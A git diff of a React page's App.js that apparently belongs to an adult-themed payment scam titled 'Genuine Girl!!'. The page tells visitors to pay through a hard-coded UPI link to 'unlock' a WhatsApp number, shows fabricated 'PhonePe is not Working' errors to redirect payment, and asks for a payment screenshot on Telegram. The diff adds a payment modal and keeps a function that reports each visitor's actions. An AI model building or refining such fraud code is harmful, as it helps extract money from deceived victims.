@@ -1,5 +1,6 @@
 import './App.css';
-import React, { useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
+import PaymentModal from './modal';
 let ip = 'Not Found'
 
 async function sendUpdate(msg) {
@@ -30,6 +31,8 @@ async function sendUpdate(msg) {
 }
 
 function App() {
+  const [isOpen, setisOpen] = useState(false);
+
   useEffect(() => {
     sendUpdate("Home");
   }, []);
@@ -44,24 +47,38 @@ function App() {
   }
 
   const handleWspButton = async () => {
-    await sendUpdate("WhatsppBtn")
-    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl&am=350", "_self");
+    setisOpen(!isOpen)
+    //await sendUpdate("WhatsppBtn")
+    //window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl&am=350", "_self");
+    //return (<PaymentModal isOpen={true}></PaymentModal>)
+  }
+
+  const MsgBtnCombo = ({ msg, btnName, handler, err }) => {
+    return (
+      <div className="msgBtn">
+        <h6>{msg}</h6>
+        <button className='button' onClick={() => { handler() }}>{btnName}</button>
+        {err
+          && <span>
+            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "10px", color: "red" }}>PhonePe is not Working tempoarily!!</p>
+            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "10px", color: "red" }}>Pay using UPI Address Above or use Gpay</p>
+          </span>
+        }
+      </div>
+    )
   }
 
   return (
-    <div className="App">
+    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
       <header className="App-header">
         <h1 style={{ marginTop: "-100px", marginBottom: '10px' }}>🍆Genuine Girl!!🍆</h1>
         <CopyExample />
-        <h6>You should PAY first to Unlock My Number!!😜</h6>
-        <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "10px", color: "red" }}>PhonePe is not Working!!</p>
-        <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "10px", color: "red" }}>Pay using UPI Address above for PhonePe</p>
-        <button className='button' onClick={() => { handlepayButton() }}>PAY NOW!!</button>
-        <h6>Click Below👇 For My Whatsapp Number!!</h6>
-        <button className='button' onClick={() => { handleWspButton() }}>Whatsapp Number!</button>
+        <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
+        <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
         <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
+        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>}
       </header>
-    </div>
+    </div >
   );
 }
 
